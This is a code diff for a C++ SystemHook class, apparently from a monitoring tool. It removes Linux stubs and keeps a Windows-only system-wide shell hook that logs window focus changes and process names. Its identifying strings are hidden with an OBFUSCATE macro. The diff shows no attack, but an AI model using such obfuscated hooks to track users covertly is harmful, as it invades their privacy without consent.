@@ -5,15 +5,8 @@
 #include "utils/StringUtils.h"
 #include "security/Obfuscation.h"
 
-#if PLATFORM_WINDOWS
 #include <Windows.h>
 #include <psapi.h>
-#elif PLATFORM_LINUX
-#include <X11/Xlib.h>
-#include <pthread.h>
-#include <unistd.h>
-#endif
-
 #include <string>
 #include <vector>
 #include <cstdint>
@@ -23,9 +16,7 @@ const std::string OBF_SYSTEMHOOK_MODULE = OBFUSCATE("SystemHook");
 const std::string OBF_FOCUSLOG_FORMAT = OBFUSCATE("FocusChange: { gained: %s, lost: %s }");
 
 // Static member initialization
-#if PLATFORM_WINDOWS
 HHOOK hooks::SystemHook::s_systemHook = nullptr;
-#endif
 hooks::SystemHook* hooks::SystemHook::s_instance = nullptr;
 
 namespace hooks {
@@ -45,7 +36,6 @@ bool SystemHook::InstallHook() {
         return true;
     }
 
-#if PLATFORM_WINDOWS
     s_systemHook = SetWindowsHookExW(
         WH_SHELL,
         ShellProc,
@@ -58,12 +48,6 @@ bool SystemHook::InstallHook() {
         LOG_ERROR("Failed to install system hook. Error: " + std::to_string(error));
         return false;
     }
-#elif PLATFORM_LINUX
-    // Linux implementation using X11 event monitoring
-    // This is a simplified approach - in production you'd want a more robust solution
-    LOG_INFO("System hook not fully implemented for Linux. Window events will not be captured.");
-    // For Linux, we could create a thread to monitor X11 events
-#endif
 
     m_isActive = true;
     LOG_INFO("System hook installed successfully");
@@ -73,23 +57,18 @@ bool SystemHook::InstallHook() {
 bool SystemHook::RemoveHook() {
     if (!m_isActive) return true;
 
-#if PLATFORM_WINDOWS
     if (s_systemHook && !UnhookWindowsHookEx(s_systemHook)) {
         DWORD error = GetLastError();
         LOG_ERROR("Failed to remove system hook. Error: " + std::to_string(error));
         return false;
     }
     s_systemHook = nullptr;
-#elif PLATFORM_LINUX
-    // Clean up Linux resources if any
-#endif
 
     m_isActive = false;
     LOG_INFO("System hook removed successfully");
     return true;
 }
 
-#if PLATFORM_WINDOWS
 LRESULT CALLBACK SystemHook::ShellProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= HC_ACTION && s_instance) {
         s_instance->ProcessShellEvent(wParam, lParam);
@@ -210,7 +189,6 @@ std::string SystemHook::GetProcessName(HWND hwnd) const {
     }
     return "Unknown";
 }
-#endif // PLATFORM_WINDOWS
 
 void SystemHook::HandleShellActivated() const {
     SystemEventData eventData;
@@ -220,33 +198,5 @@ void SystemHook::HandleShellActivated() const {
     m_dataManager->AddSystemEventData(eventData);
     LOG_DEBUG("Shell activated");
 }
-
-#if PLATFORM_LINUX
-void* SystemHook::LinuxEventThread(void* context) {
-    if (auto* instance = static_cast<SystemHook*>(context)) {
-        instance->LinuxEventLoop();
-    }
-    return nullptr;
-}
-
-void SystemHook::LinuxEventLoop() const {
-    // Placeholder for Linux X11 event monitoring   
-    // In a real implementation, you would:
-    // 1. Open X11 display connection
-    // 2. Monitor for window creation/destruction events
-    // 3. Monitor for focus change events
-    
-    LOG_INFO("Linux system event monitoring started (placeholder)");
-    
-    while (m_isActive) {
-        // Use sleep function appropriate for the platform
-        #if PLATFORM_WINDOWS
-        Sleep(1000);
-        #else
-        sleep(1);
-        #endif
-    }
-}
-#endif // PLATFORM_LINUX
 
 } // namespace hooks
